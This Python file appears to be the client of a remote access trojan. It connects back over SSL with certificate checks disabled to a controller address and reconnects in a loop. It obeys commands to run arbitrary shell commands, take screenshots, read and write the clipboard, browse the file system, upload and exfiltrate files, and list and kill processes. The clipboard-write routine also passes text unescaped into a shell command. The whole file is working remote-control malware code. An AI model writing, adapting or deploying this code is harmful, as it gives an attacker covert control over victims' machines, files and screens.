import socket
import ssl
import requests
import platform
import os
import subprocess
import time
import threading

HOST = "127.0.0.1"
PORT = 6654
RECONNECT_DELAY = 5

# ---------- SSL ----------

def wrap_ssl(sock):
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    return context.wrap_socket(sock)

# ---------- Connection setup ----------

def connect():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((HOST, PORT))
            sock = wrap_ssl(sock)
            print("[+] Connected to server (SSL).")
            return sock
        except Exception as e:
            time.sleep(RECONNECT_DELAY)

# ---------- Device info ----------

def get_device_info():
    try:
        ip = requests.get("https://api.ipify.org", timeout=5).text
    except:
        ip = "Unable to fetch"
    return (
        f"Public IP : {ip}\n"
        f"OS        : {platform.platform()}\n"
        f"Directory : {os.getcwd()}"
    )

def command_execute():
    return os.getcwd()

def number_of_files():
    i = 0
    try:
        for root, dirs, files in os.walk('/'):
            for file in files:
                i += 1
    except PermissionError:
        pass
    return f'Number Of Files: {i}'

def number_of_images():
    count = 0
    try:
        for root, dirs, files in os.walk('/'):
            for file in files:
                if file.endswith(('.png', '.jpg', '.jpeg', '.gif', '.bmp')):
                    count += 1
    except PermissionError:
        pass
    return f'Number of Images: {count}'

# ---------- Header helpers ----------

def recv_header(sock):
    data = b""
    while b"\n" not in data:
        chunk = sock.recv(1)
        if not chunk:
            raise ConnectionError("Connection closed while reading header.")
        data += chunk
    return data.decode().strip()

# ---------- File transfer ----------

def send_file(sock, filename):
    if not os.path.exists(filename):
        sock.sendall(f"ERROR|File not found: {filename}\n".encode())
        print(f"[-] File not found: {filename}")
        return False
    filesize = os.path.getsize(filename)
    header = f"{os.path.basename(filename)}|{filesize}\n"
    sock.sendall(header.encode())
    sent = 0
    with open(filename, "rb") as f:
        while True:
            chunk = f.read(65536)
            if not chunk:
                break
            sock.sendall(chunk)
            sent += len(chunk)
            percent = sent / filesize * 100 if filesize else 100
            print(f"\r[+] Sending {filename}: {percent:5.1f}%", end="", flush=True)
    print(f"\n[+] {filename} sent successfully.")
    return True

def receive_file(sock):
    header = recv_header(sock)
    if header.startswith("ERROR"):
        _, message = header.split("|", 1)
        print(f"[-] Server error: {message}")
        return False
    filename, filesize = header.rsplit("|", 1)
    filesize = int(filesize)
    received = 0
    with open(filename, "wb") as f:
        remaining = filesize
        while remaining > 0:
            chunk = sock.recv(min(65536, remaining))
            if not chunk:
                raise ConnectionError("Connection closed before full file was received.")
            f.write(chunk)
            remaining -= len(chunk)
            received += len(chunk)
            percent = received / filesize * 100 if filesize else 100
            print(f"\r[+] Receiving {filename}: {percent:5.1f}%", end="", flush=True)
    print(f"\n[+] {filename} received successfully.")
    return True

# ---------- Shell (persistent cwd) ----------

shell_cwd = os.getcwd()

def execute_shell_command(command):
    global shell_cwd
    if command.strip().startswith("cd"):
        try:
            parts = command.strip().split(maxsplit=1)
            path = parts[1] if len(parts) > 1 else os.path.expanduser("~")
            new_cwd = os.path.abspath(os.path.join(shell_cwd, path))
            if os.path.isdir(new_cwd):
                shell_cwd = new_cwd
                return f"[+] Changed directory to: {shell_cwd}<<END>>"
            else:
                return f"[-] No such directory: {new_cwd}<<END>>"
        except Exception as e:
            return f"Error: {e}<<END>>"
    try:
        result = subprocess.run(
            command, shell=True, capture_output=True,
            text=True, timeout=30, cwd=shell_cwd
        )
        output = result.stdout + result.stderr
        output = output if output else "Command executed with no output."
        return output + "<<END>>"
    except subprocess.TimeoutExpired:
        return "Command timed out.<<END>>"
    except Exception as e:
        return f"Error: {e}<<END>>"

# ---------- Process list ----------

def get_process_list():
    try:
        if platform.system() == "Windows":
            result = subprocess.run("tasklist", capture_output=True, text=True)
        else:
            result = subprocess.run(["ps", "aux"], capture_output=True, text=True)
        return result.stdout if result.stdout else "No processes found."
    except Exception as e:
        return f"Error: {e}"

# ---------- Kill process ----------

def kill_process(pid):
    try:
        import signal
        os.kill(int(pid), signal.SIGTERM)
        return f"[+] Process {pid} terminated."
    except ProcessLookupError:
        return f"[-] Process {pid} not found."
    except PermissionError:
        return f"[-] Permission denied to kill process {pid}."
    except Exception as e:
        return f"Error: {e}"

# ---------- Screenshot ----------

def take_screenshot(sock):
    try:
        system = platform.system()

        if system in ("Windows", "Darwin"):
            try:
                from PIL import ImageGrab
            except ImportError:
                sock.sendall("ERROR|Pillow not installed. Run: pip install Pillow\n".encode())
                return ""
            img = ImageGrab.grab(all_screens=True)
            tmp_path = "/tmp/screenshot.png" if system == "Darwin" else os.path.join(os.environ.get("TEMP", "."), "screenshot.png")
            img.save(tmp_path, format="PNG")

        elif system == "Linux":
            tmp_path = "/tmp/screenshot.png"
            if os.system("which scrot > /dev/null 2>&1") == 0:
                os.system(f"scrot {tmp_path}")
            elif os.system("which gnome-screenshot > /dev/null 2>&1") == 0:
                os.system(f"gnome-screenshot -f {tmp_path}")
            else:
                try:
                    subprocess.run(["import", "-window", "root", tmp_path], timeout=5)
                except Exception:
                    sock.sendall("ERROR|Install scrot: sudo apt install scrot\n".encode())
                    return ""
            if not os.path.exists(tmp_path):
                sock.sendall("ERROR|Screenshot file not created.\n".encode())
                return ""
        else:
            sock.sendall(f"ERROR|Unsupported OS: {system}\n".encode())
            return ""

        send_file(sock, tmp_path)
        os.remove(tmp_path)
        return ""
    except Exception as e:
        sock.sendall(f"ERROR|Screenshot failed: {e}\n".encode())
        return ""

# ---------- File browser ----------

def file_browser(path):
    try:
        path = os.path.abspath(path)
        if not os.path.exists(path):
            return f"[-] Path not found: {path}"
        if os.path.isfile(path):
            size = os.path.getsize(path)
            return f"[FILE] {path} ({size} bytes)"
        entries = []
        entries.append(f"[DIR] {path}\n" + "-"*50)
        for entry in sorted(os.scandir(path), key=lambda e: (not e.is_dir(), e.name)):
            try:
                if entry.is_dir():
                    entries.append(f"  [D] {entry.name}/")
                else:
                    size = entry.stat().st_size
                    entries.append(f"  [F] {entry.name:<40} {size} bytes")
            except PermissionError:
                entries.append(f"  [?] {entry.name} (permission denied)")
        return "\n".join(entries)
    except Exception as e:
        return f"Error: {e}"

# ---------- Clipboard ----------

def clipboard_read():
    try:
        system = platform.system()
        if system == "Windows":
            import subprocess
            result = subprocess.run("powershell Get-Clipboard", capture_output=True, text=True, shell=True)
            return result.stdout.strip() or "Clipboard is empty."
        elif system == "Darwin":
            result = subprocess.run("pbpaste", capture_output=True, text=True)
            return result.stdout or "Clipboard is empty."
        else:
            result = subprocess.run(["xclip", "-selection", "clipboard", "-o"], capture_output=True, text=True)
            if result.returncode != 0:
                result = subprocess.run(["xsel", "--clipboard", "--output"], capture_output=True, text=True)
            return result.stdout or "Clipboard is empty."
    except Exception as e:
        return f"Error reading clipboard: {e}"

def clipboard_write(text):
    try:
        system = platform.system()
        if system == "Windows":
            subprocess.run(f'echo {text} | clip', shell=True)
        elif system == "Darwin":
            subprocess.run("pbcopy", input=text.encode(), check=True)
        else:
            try:
                subprocess.run(["xclip", "-selection", "clipboard"], input=text.encode(), check=True)
            except Exception:
                subprocess.run(["xsel", "--clipboard", "--input"], input=text.encode(), check=True)
        return "[+] Clipboard updated."
    except Exception as e:
        return f"Error writing clipboard: {e}"

# ---------- Command processor ----------

def process_command(command, sock):
    if command == "1":
        return get_device_info()
    elif command == "2":
        return "Hello from the client!"
    elif command == "3":
        return number_of_files()
    elif command == "4":
        return number_of_images()
    elif command == "5":
        return "File transfer mode - use download or upload commands instead."
    elif command == "6":
        return command_execute()
    elif command == "PSLIST":
        return get_process_list()
    elif command.startswith("KILL|"):
        _, pid = command.split("|", 1)
        return kill_process(pid)
    elif command == "SCREENSHOT":
        return take_screenshot(sock)
    elif command.startswith("BROWSE|"):
        _, path = command.split("|", 1)
        return file_browser(path)
    elif command == "CLIP_READ":
        return clipboard_read()
    elif command.startswith("CLIP_WRITE|"):
        _, text = command.split("|", 1)
        return clipboard_write(text)
    elif command.startswith("DOWNLOAD|"):
        _, filename = command.split("|", 1)
        send_file(sock, filename)
        return ""
    elif command.startswith("UPLOAD|"):
        receive_file(sock)
        return ""
    elif command.startswith("SHELL|"):
        _, shell_cmd = command.split("|", 1)
        return execute_shell_command(shell_cmd)
    else:
        return "Unknown command."

# ---------- Main client loop (auto-reconnect) ----------

def main():
    while True:
        sock = connect()
        try:
            while True:
                data = sock.recv(4096)
                if not data:
                    break
                command = data.decode().strip()
                result = process_command(command, sock)
                if result:
                    sock.sendall(result.encode())
        except ConnectionError as e:
            print(f"[-] Connection error: {e}")
        except Exception as e:
            print(f"[-] Unexpected error: {e}")
        finally:
            sock.close()
            print(f"[*] Reconnecting in {RECONNECT_DELAY}s...")
            time.sleep(RECONNECT_DELAY)

if __name__ == "__main__":
    main()
